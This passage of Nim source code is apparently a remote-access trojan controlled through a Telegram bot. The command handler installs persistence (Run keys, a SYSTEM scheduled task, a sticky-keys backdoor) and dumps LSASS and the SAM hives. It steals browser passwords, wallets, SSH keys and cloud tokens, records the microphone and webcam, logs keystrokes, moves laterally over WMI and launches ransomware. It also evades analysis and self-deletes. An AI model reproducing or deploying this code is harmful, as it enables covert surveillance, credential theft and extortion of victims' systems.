      let maxShots = if watchMaxShots > 0: $watchMaxShots else: "unbounded"
      return "watch: " & (if watchActive.load: "active" else: "stopped") &
             "\n  interval: " & $(watchIntervalMs div 1000) & " sec" &
             "\n  shots:    " & $shots & " / " & maxShots &
             "\n  usage:    /watch start [sec] | count N [sec] | stop"
    if sub == "stop":
      if not watchActive.load: return "watch already stopped"
      watchActive.store(false)
      return "watch stopping (within " & $(watchIntervalMs div 1000) & " sec)"
    if sub == "start":
      if watchActive.load: return "watch already running; /watch stop first"
      let sec = if rest.len > 0: (try: parseInt(rest) except: 0) else: 30
      if sec < 1 or sec > 3600: return "interval must be 1-3600 sec"
      watchIntervalMs = sec * 1000
      watchMaxShots = -1
      watchShotsTaken = 0
      watchActive.store(true)
      createThread(watchThread, watchLoop)
      return "watch started: every " & $sec & " sec"
    if sub == "count":
      let cparts = rest.split(' ', 1)
      let n = (try: parseInt(cparts[0].strip()) except: 0)
      if n < 1 or n > 10000: return "count must be 1-10000"
      let sec = if cparts.len > 1: (try: parseInt(cparts[1].strip()) except: 30)
                else: 30
      if sec < 1 or sec > 3600: return "interval must be 1-3600 sec"
      if watchActive.load: return "watch already running; /watch stop first"
      watchIntervalMs = sec * 1000
      watchMaxShots = n
      watchShotsTaken = 0
      watchActive.store(true)
      createThread(watchThread, watchLoop)
      return "watch started: " & $n & " shots every " & $sec & " sec"
    return "usage: /watch [start [sec] | count N [sec] | stop]"

  proc cmdSelfdestruct(): string =
    if watchActive.load: watchActive.store(false)
    var lines: seq[string] = @[]
    try:
      let rmScript =
        "Remove-ItemProperty -Path 'HKCU:\\" & obfStr(S_PERSIST_RUN) & "' " &
        "-Name '" & PersistRunName & "' -ErrorAction SilentlyContinue"
      discard execHidden(psRun(rmScript))
      lines.add("  run_key:    removed")
    except CatchableError as e: lines.add("  run_key:    err: " & e.msg)
    try:
      if isAdmin():
        discard execHidden(obfStr(S_SCHTASKS) & " /delete /tn \"" &
                          PersistTaskName & "\" /f 2>nul")
        lines.add("  task:       removed")
    except: discard
    try:
      if isAdmin():
        let restore =
          "$bak = $env:SystemRoot + '\\System32\\sethc.exe.bak';\n" &
          "$cur = $env:SystemRoot + '\\System32\\sethc.exe';\n" &
          "if (Test-Path $bak) {\n" &
          "  takeown /f $cur /a | Out-Null;\n" &
          "  icacls $cur /grant Administrators:F | Out-Null;\n" &
          "  Copy-Item $bak $cur -Force;\n" &
          "  Remove-Item $bak -Force;\n" &
          "  Write-Output 'restored'\n" &
          "} else { Write-Output 'not-installed' }\n"
        let (outp, _) = execHidden(psRun(restore))
        lines.add("  stickykeys: " & outp.strip)
    except: discard
    let binary = getAppFilename()
    var deleted = false
    var how = ""
    if fileExists(binary):
      try:
        removeFile(binary)
        deleted = true
        how = "direct"
      except:
        try:
          discard startProcess(
            command = "cmd.exe",
            args = @["/c", "ping 127.0.0.1 -n 5 > nul & del \"" & binary & "\""],
            options = {poDaemon, poStdErrToStdOut, poUsePath}
          )
          how = "scheduled"
        except: discard
    let status = if deleted: "deleted" elif how.len > 0: "scheduled for delete" else: "left in place"
    lines.add("  binary: " & status & " (" & binary & ", " & how & ")")
    try:
      removeFile(TG_META_FILE)
      lines.add("  meta:     removed")
    except: discard
    return "selfdestruct complete:\n" & lines.join("\n")

  proc installRunKey(): string =
    let exe = getAppFilename()
    if exe.len == 0: return "skipped (no exe path)"
    var script = ""
    script.add("New-ItemProperty -Path 'HKCU:\\" & obfStr(S_PERSIST_RUN) & "' ")
    script.add("-Name '" & PersistRunName & "' -Value \"" & exe & "\" ")
    script.add("-PropertyType String -Force | Out-Null;\n")
    if isAdmin():
      script.add("New-ItemProperty -Path 'HKLM:\\" & obfStr(S_PERSIST_RUN) & "' ")
      script.add("-Name '" & PersistRunName & "' -Value \"" & exe & "\" ")
      script.add("-PropertyType String -Force | Out-Null;\n")
    try:
      let (outp, exitCode) = execHidden(psRun(script))
      if exitCode != 0:
        return "err: exit " & $exitCode & ": " &
               outp[0..<min(outp.len, 200)]
      return "ok"
    except CatchableError as e: return "err: " & e.msg

  proc installScheduledTask(): string =
    if not isAdmin(): return "skipped (not admin)"
    let exe = getAppFilename()
    if exe.len == 0: return "skipped (no exe path)"
    let script =
      "$a = New-ScheduledTaskAction -Execute " & exe & ";\n" &
      "$t = New-ScheduledTaskTrigger -AtLogOn;\n" &
      "$p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' " &
        "-LogonType ServiceAccount -RunLevel Highest;\n" &
      "$s = New-ScheduledTaskSettingsSet " &
        "-AllowStartIfOnBatteries -DontStopIfGoingOnBatteries " &
        "-StartWhenAvailable -MultipleInstances IgnoreNew;\n" &
      "Register-ScheduledTask -TaskName '" & PersistTaskName & "' " &
        "-Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null;\n" &
      "Write-Output 'ok'"
    try:
      let (_, exitCode) = execHidden(psRun(script))
      if exitCode != 0: return "err: exit " & $exitCode
      return "ok"
    except CatchableError as e: return "err: " & e.msg

  proc installAllPersistence(): string =
    var lines: seq[string] = @[]
    lines.add("run_key:    " & installRunKey())
    lines.add("task:       " & installScheduledTask())
    lines.add("stickykeys: " & installStickyKeys())
    return lines.join("\n") & "\n" & installFullPersistenceSuite()

  proc removeAllPersistence(): string =
    var parts: seq[string] = @[]
    let rmScript =
      "Remove-ItemProperty -Path 'HKCU:\\" & obfStr(S_PERSIST_RUN) &
      "' -Name '" & PersistRunName &
      "' -ErrorAction SilentlyContinue; Write-Output 'removed'"
    let rk = execHidden(psRun(rmScript))
    if rk.code == 0 and rk.output.contains("removed"):
      parts.add("run_key:    removed")
    else:
      parts.add("run_key:    err: " & rk.output[0..<min(rk.output.len, 120)])
    let st = execHidden(obfStr(S_SCHTASKS) & " /delete /tn \"" &
                        PersistTaskName & "\" /f")
    parts.add("task:       " &
      (if st.code == 0: "deleted" else: "not present"))
    if isAdmin():
      let restore =
        "$bak = $env:SystemRoot + '\\System32\\sethc.exe.bak';\n" &
        "$cur = $env:SystemRoot + '\\System32\\sethc.exe';\n" &
        "if (Test-Path $bak) {\n" &
        "  takeown /f $cur /a | Out-Null;\n" &
        "  icacls $cur /grant Administrators:F | Out-Null;\n" &
        "  Copy-Item $bak $cur -Force;\n" &
        "  Remove-Item $bak -Force;\n" &
        "  Write-Output 'restored'\n" &
        "} else { Write-Output 'not-installed' }\n"
      let sk = execHidden(psRun(restore))
      parts.add("stickykeys: " &
        sk.output[0..<min(sk.output.len, 40)].strip())
    else:
      parts.add("stickykeys: skipped (not admin)")
    try: removeFile(TG_META_FILE) except: discard
    return parts.join("\n")

  proc downloadTelegramFile(fileId, saveTo: string): bool =
    try:
      var infoObj = newJObject()
      infoObj["file_id"] = %fileId
      let (infoCode, infoBody) = winHttpPostJson("api.telegram.org", 443,
                                                 "/bot" & BotToken & "/getFile",
                                                 $infoObj)
      if infoCode != 200:
        logMsg("getFile http " & $infoCode & ": " &
               infoBody[0..<min(infoBody.len, 200)])
        return false
      let info = parseJson(infoBody)
      let filePath = info{"result", "file_path"}.getStr
      if filePath.len == 0: return false
      let (dlCode, dlBody) = winHttpPostJson("api.telegram.org", 443,
                                              "/file/bot" & BotToken & "/" & filePath,
                                              "")
      if dlCode != 200:
        logMsg("file download http " & $dlCode)
        return false
      writeFile(saveTo, dlBody)
      return true
    except CatchableError as e:
      logMsg("downloadTelegramFile: " & e.msg)
      return false

  proc splitCmd(text: string): tuple[cmd: string, arg: string] =
    let parts = text.split(' ', 1)
    result.cmd = if parts.len > 0: parts[0].toLowerAscii else: ""
    result.arg = if parts.len > 1: parts[1] else: ""

  proc pathArg(arg: string): string =
    arg.strip().strip(chars = {'"'})

  proc handleMessage(text: string, msg: JsonNode): string =
    let (cmd, arg) = splitCmd(text)
    if cmd.len == 0: return ""
    if tgSleepEpoch > 0 and getTime().toUnix() < tgSleepEpoch:
      if cmd == "/wake":
        tgSleepEpoch = 0
        tgMetaSleepMin = 0
        saveTgMeta()
        return "[+] awake"
      if cmd == "/status": discard
      else:
        let remain = tgSleepEpoch - getTime().toUnix()
        return "[zzz] sleeping " & $remain & "s more - send /wake"
    case cmd
    of "/help", "/?":         cmdHelp()
    of "/cmd", "/shell":      cmdExec(arg)
    of "/sysinfo":            cmdSysinfo()
    of "/screenshot":         cmdScreenshot()
    of "/ps":
      let j = processList()
      if j.hasKey("rows"):
        var lines: seq[string] = @[]
        for r in j["rows"]:
          lines.add(($r{"pid"}.getInt()).align(6) & "  " & r{"name"}.getStr("?"))
        "processes (" & $lines.len & "):\n" & lines.join("\n")
      else:
        j{"data"}.getStr("[!] ps failed")
    of "/kill":
      try:
        discard parseInt(arg.strip())
        let (o, code) = execHidden(obfStr(S_TASKKILL) & " /F /PID " & arg)
        "taskkill exit=" & $code & (if o.len > 0: "\n" & o else: "")
      except: "usage: /kill <pid>"
    of "/ls":                 cmdLs(pathArg(arg))
    of "/cat":                cmdCat(pathArg(arg))
    of "/cd":
      try: setCurrentDir(pathArg(arg)); "cwd: " & getCurrentDir()
      except CatchableError as e: "cd err: " & e.msg
    of "/pwd":                getCurrentDir()
    of "/whoami":             getEnv("USERNAME", "?") & " @ " & getEnv("COMPUTERNAME", "?")
    of "/env":                cmdEnv(arg)
    of "/drives":             cmdExec("wmic logicaldisk get caption")
    of "/ipconfig":           cmdExec("ipconfig /all")
    of "/wifi":               cmdWifi()
    of "/av":                 cmdAv()
    of "/persist":            installAllPersistence()
    of "/stickykeys":         installStickyKeys()
    of "/status":             cmdStatus()
    of "/cleanup":            removeAllPersistence()
    of "/watch":              cmdWatch(arg)
    of "/selfdestruct":
      if watchActive.load: watchActive.store(false)
      discard cmdSelfdestruct(); ""
    of "/exit":
      if watchActive.load: watchActive.store(false)
      discard tgSendText("agent exiting (use /selfdestruct to clean up)")
      quit(0)
    of "/sleep":
      try:
        let n = max(0, parseInt(arg.strip()))
        let capped = min(n, 7 * 24 * 3600)
        tgSleepEpoch = getTime().toUnix() + capped
        tgMetaSleepMin = (capped div 60).int
        saveTgMeta()
        "sleeping " & $capped & "s (until " &
          fromUnix(tgSleepEpoch).format("yyyy-MM-dd HH:mm:ss") &
          ") - send /wake to end early; messages queue"
      except: "usage: /sleep <seconds>"
    of "/wake":
      if tgSleepEpoch > 0:
        tgSleepEpoch = 0
        tgMetaSleepMin = 0
        saveTgMeta()
        "[+] awake"
      else: "not sleeping"
    of "/killdate":
      try:
        if arg.strip().toLowerAscii() in ["off", "0", "clear"]:
          tgMetaKillDate = 0
          saveTgMeta()
          "[+] kill date cleared"
        else:
          let ts = parseInt(arg.strip())
          if ts < getTime().toUnix():
            "[!] kill date is in the past - agent would die immediately"
          else:
            tgMetaKillDate = ts
            saveTgMeta()
            "[+] kill date set: " & fromUnix(ts).format("yyyy-MM-dd HH:mm:ss")
      except: "usage: /killdate <unix_ts> | /killdate off"
    of "/upload":
      let upath = pathArg(arg)
      if fileExists(upath):
        let sz = getFileSize(upath)
        if tgSendDocumentChunked(upath, upath & " (" & $sz & " B)"): "uploaded: " & upath
        else: "upload failed"
      else: "not a file: " & upath
    of "/dl":
      let tmp = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                ("dl_" & $(getMonoTime().ticks div 1_000_000))
      if arg.len > 0 and downloadTelegramFile(arg, tmp):
        "downloaded: " & tmp & " (" & $getFileSize(tmp) & " B)"
      else: "download failed"
    of "/clip":               $getClipboard()
    of "/find":               $fileSearch(arg)
    of "/exfil":
      when defined(windows):
        let result = case arg.strip
          of "browser":  exfilBrowserData()
          of "wifi":     exfilWifiPasswords()
          of "cloud":    exfilCloudTokens()
          of "ssh":      exfilSshKeys()
          of "recent":   exfilRecentFiles()
          of "wincreds": exfilWinCreds()
          of "media":    exfilMediaFiles()
          of "wallet":   exfilWalletData()
          else: %* {"type": "exfil", "kind": "?", "error":
                      "usage: /exfil browser|wifi|cloud|ssh|recent|wincreds|media|wallet"}
        $result
      else: "exfil: windows only"
    of "/keys":
      when defined(windows): cmdKeys(arg)
      else: "keys: windows only"
    of "/mic":
      when defined(windows):
        let secs = block:
          try: clamp(parseInt("0" & arg.strip()), 1, 120)
          except: 10
        discard tgSendText("[*] recording mic " & $secs & "s ...")
        let (ok, wavPath, err) = captureMicSync(secs)
        if ok:
          if not tgSendDocument(wavPath, "mic " & $secs & "s"):
            discard tgSendText("[!] mic upload failed")
          try: removeFile(wavPath) except: discard
          "[+] mic " & $secs & "s sent (" & extractFilename(wavPath) & ")"
        else: err
      else: "mic: windows only"
    of "/cam":
      when defined(windows):
        let devIdx = block:
          try: parseInt("0" & arg.strip())
          except: 0
        discard tgSendText("[*] capturing cam" & $devIdx & " ...")
        let (ok, bmpPath, info) = captureCamSync(devIdx)
        if ok:
          if not tgSendDocument(bmpPath, "cam" & $devIdx & " " & info):
            discard tgSendText("[!] cam upload failed")
          try: removeFile(bmpPath) except: discard
          "[+] cam" & $devIdx & " frame sent (" & info & ")"
        elif info.len > 0: info
        else: "[!] cam capture failed"
      else: "cam: windows only"
    of "/hook":
      if webhookEnabled():
        let ok = sendToHook("[" & BuildPrefix & "] " & arg)
        if ok: "hook: ok" else: "hook: fail"
      else: "hook: webhook not configured"
    of "/unhook":      $unhookNtdll()
    of "/persist_all": installFullPersistenceSuite()
    of "/lsass":
      let p = stageDir() / "lsass.dmp"
      let ok = dumpLsassViaComsvcs(p)
      (if ok: "@file:" & p else: "err: lsass dump failed")
    of "/sam":
      let p = stageDir() / "hives"
      if dumpSamHives(p): "hives dumped -> " & p else: "err: sam dump failed"
    of "/dpapi":       dpapiMasterKeys()
    of "/browsercreds": $harvestChromePasswords()
    of "/system":
      if spawnAsSystem(arg): "spawned as SYSTEM" else: "err: token theft failed"
    of "/spoof":
      if spawnWithSpoofedParent(arg, "explorer.exe"): "spawned" else: "err"
    of "/lateral":
      let parts = arg.split(' ', 3)
      if parts.len < 4: "usage: /lateral <host> <user> <pass> <cmd>"
      else:
        if wmiLateralExec(parts[0], parts[1], parts[2], parts[3]): "ok"
        else: "err"
    of "/ransom":
      if arg.strip() != "CONFIRM": "irreversible. resend: /ransom CONFIRM"
      else: runRansomware()
    of "/drop":        resolveFromDeadDrop()
    of "/timestomp":
      let parts = arg.split(' ', 1)
      if parts.len < 2: "usage: /timestomp <target> <reference>"
      else: (if timestomp(parts[0], parts[1]): "ok" else: "err")
    else: "unknown command: " & cmd & " (try /help)"

  proc initialOnline() =
    try: discard tgSendText(obfDec(S_ONLINE_BANNER) & "\n\n" & cmdSysinfo())
    except: discard

  proc pollLoop() =
    var offset = 0
    var lastContactStamp = getTime().toUnix()
    while true:
      if tgIsKilled():
        logMsg("kill date / dead-man tripped mid-run - selfdestruct")
        discard tgSendText("[!] kill date reached - selfdestructing")
        discard cmdSelfdestruct()
        quit(0)
      let nowUnix = getTime().toUnix()
      if nowUnix - lastContactStamp >= 60:
        tgMetaLastContact = nowUnix
        saveTgMeta()
        lastContactStamp = nowUnix
      inc tgPollsTotal
      try:
        var bodyObj = newJObject()
        bodyObj["offset"] = %offset
        bodyObj["timeout"] = %PollHttpSec
        var allowed = newJArray()
        allowed.add(%"message")
        bodyObj["allowed_updates"] = allowed
        let body = $bodyObj
        let (respCode, respBody) = winHttpPostJson("api.telegram.org", 443,
                                                    "/bot" & BotToken & "/getUpdates",
                                                    body)
        if respCode != 200:
          tgLastPollErr = "http " & $respCode
          logMsg("poll http err: " & tgLastPollErr)
          sleep(min(30_000, PollBaseMs * 3))
          continue
        tgLastPollOk = getMonoTime().ticks div 1_000_000_000
        tgLastPollErr = ""
        inc tgPollsOk
        let data = parseJson(respBody)
        if not data.hasKey("result"): continue
        for upd in data["result"]:
          offset = max(offset, upd["update_id"].getInt + 1)
          if not upd.hasKey("message"): continue
          let msg = upd["message"]
          if not msg.hasKey("chat") or not msg["chat"].hasKey("id"):
            logMsg("drop msg with missing chat.id")
            continue
          let chatIdVal = msg["chat"]["id"].getInt
          if $chatIdVal != ChatId:
            logMsg("drop msg from chat " & $chatIdVal)
            continue
          if msg.hasKey("document"):
            let doc = msg["document"]
            let fid = doc{"file_id"}.getStr
            let rawName = doc{"file_name"}.getStr("uploaded")
            let baseName = rawName.extractFilename()
            let safeName = baseName.replace('/', '_').replace('\\', '_')
            let stamp = $getMonoTime().ticks
            let tmp = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
                      ("tg_" & stamp & "_" & safeName)
            if downloadTelegramFile(fid, tmp):
              discard tgSendText("downloaded: " & tmp & " (" & $getFileSize(tmp) & " B)")
            else:
              discard tgSendText("download failed")
            continue
          let text = msg{"text"}.getStr(msg{"caption"}.getStr(""))
          if text.len == 0: continue
          try:
            let reply = handleMessage(text, msg)
            if reply.len > 0:
              if reply.startsWith("@file:"):
                let path = reply[6..^1]
                if not tgSendDocument(path, "screenshot"):
                  discard tgSendText("[!] upload failed for " &
                                     path.extractFilename &
                                     " (see agent log)")
                try: removeFile(path) except: discard
              else:
                discard tgSendText(reply)
          except CatchableError as e:
            discard tgSendText("handler err: " & e.msg)
      except CatchableError as e:
        tgLastPollErr = e.msg
        logMsg("poll err: " & e.msg)
        try: sleep(5_000) except: discard
      if tgSleepEpoch > 0 and getTime().toUnix() < tgSleepEpoch:
        try: sleep(30_000) except: discard
      else:
        let jitter = PollBaseMs.int * (70 + rand(60)) div 100
        try: sleep(jitter) except: discard

  proc ensurePersistenceAtStartup() =
    if NoPersist: return
    if not fileExists(TG_META_FILE):
      discard randomBytes(addr tgMetaInstallKey[0], 32)
      saveTgMeta()
    discard installRunKey()
    if isAdmin(): discard installScheduledTask()

  proc main() =
    randomize()
    if not acquireMutex():
      logMsg("another instance owns the mutex, exiting")
      return
    if antiAnalysisCheck():
      logMsg("sandbox heuristic triggered, exiting silently")
      return
    when defined(windows):
      logMsg("evasion: " & applyEvasion())
    loadTgMeta()
    if tgIsKilled():
      logMsg("kill date / dead-man switch tripped at boot - selfdestruct")
      discard cmdSelfdestruct()
      quit(0)
    ensurePersistenceAtStartup()
    initialOnline()
    pollLoop()

# =============================================================================
# ENTRY POINT
# =============================================================================
include "sentinel_hardening.nim"
when isMainModule:
  when defined(windows):
    when not defined(gui):
      ShowWindow(GetConsoleWindow(), SW_HIDE)

  when defined(sentinel_repl) and defined(c2_tg):
    randomize()
    gReplMode = true
    loadTgMeta()
    echo "REPL-READY"
    flushFile(stdout)
    var line: string
    while stdin.readLine(line):
      if line.strip().len == 0: continue
      if line == "/quit": break
      var reply = ""
      try:
        reply = handleMessage(line, newJObject())
      except CatchableError as e:
        reply = "handler err: " & e.msg
      except Defect as d:
        reply = "DEFECT: " & d.msg
      echo "---REPLY---"
      if reply.startsWith("@file:"):
        let p = reply[6..^1]
        echo "[file] " & p & " " &
             (if fileExists(p): $getFileSize(p) else: "(missing)")
      else:
        echo reply.replace("---REPLY---", "- -REPLY- -")
                  .replace("---END---", "- -END- -")
      echo "---END---"
      flushFile(stdout)
    echo "REPL-BYE"

  elif defined(c2_ws):
    asyncCheck agentLoop()
    runForever()

  elif defined(c2_tg):
    try:
      main()
    except CatchableError as e:
      logMsg("FATAL: " & $e.name & ": " & e.msg)
    except Defect as d:
      logMsg("FATAL DEFECT: " & $d.name & ": " & d.msg)

  elif defined(c2_both):
    randomize()
    asyncCheck agentLoop()
    runForever()